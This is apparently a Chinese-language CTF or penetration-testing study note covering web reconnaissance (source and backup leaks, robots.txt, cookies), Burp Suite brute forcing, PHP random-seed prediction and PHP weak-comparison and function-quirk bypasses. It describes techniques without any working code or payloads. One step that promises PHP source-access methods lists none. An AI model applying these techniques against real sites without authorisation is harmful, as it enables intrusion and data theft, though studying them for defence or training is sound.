信息收集

展开攻击之前的必要步骤；

源码泄露

  1. 开发注释未及时删除,按F12可以查看源码获取信息；

  2. 有些网页设置了js前台绕过无法按F12，在网址前端添加view-source:或者前往浏览器设置关闭javascript即可绕过；

  3. 对于采用PHP语言且缺乏防护的网页，通过以下访问手段可以获取到网页PHP源代码；

  4. 版本控制泄露

敏感数据泄露

  1. robots后台泄露
    robots.txt规定了用户能够访问网页的范围；
    缺乏防护时，访问robots.txt可以获取到网页关键路径等信息；

  2. 探针泄露
    开发完成后，未及时删除的探针可能导致信息泄露；
    记得删除探针，或者将探针命名为复杂不易猜的名字。

  3. cookie泄露
    cookie的本质是一个文档，它会记录用户的访问信息；
    如果没有对cookie设置HttpOnly属性，一旦被截获就会造成信息泄露；

  4. 数据库恶意下载
    mdb文件是早期asp + access架构的数据库文件，文件泄露相当于数据库被脱裤了；
    与此同时，备份的sql文件也可能会泄露敏感信息；

暴力破解

想要实现网页爆破，你需要学会使用Burpsuite

  1. 纯数字情形
    对于纯数字组合的信息，可以使用Burpsuite设置区间构造字典实施爆破。爆破完成后，通过返回长度可以很容易地确认密码，随后查看响应内容获取信息。

  2. 一般情形
    如果爆破内容包含了字母以及特殊字符，也可以采用上面的方法，但是比较费时间。最好调用自己提前准备好的字典，后面的操作方法同上。

  3. 随机数情形
    如果要爆破的信息是用随机数种子动态生成的，就不要头铁爆破了（这里用到了伪随机数漏洞，详见下文）。先在本地搭建好PHP环境或Linux环境，然后调用靶场的随机数种子生成随机数，最后传参。

PHP特性

变量特性

  1. 默认字符串类型；
  2. 使用不同进制、不同类型、有无+号表示同一个数，含义相同；
  3. 数组绕过；
  4. 变量覆盖；

弱比较

  1. intval()
    用于获取参数的整数值；
    intval()转换数组类型时，不关心数组中的内容，只判断数组中有没有元素；
    如果$base为0，则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，在PHP中可以不是科学计数法；
  2. md5()
    MD5加密漏洞，不同的字符串可能拥有相同的md5值；
  3. 逻辑弱比较
    在进行多条件比较时，代码只会判断第一个条件是否为真，不会判断后面的条件；

函数特性

  1. substr($v2, num)
    截掉字符串v2的前num个字符；
    如果要保留完整内容。需要在字符串前添加num个字符绕过截断；
    当num < 0时，则截掉字符串v2的后num个字符，需要在字符串后面添加；

  2. hex2bin(hex)
    将十六进制数hex转换成字符串；
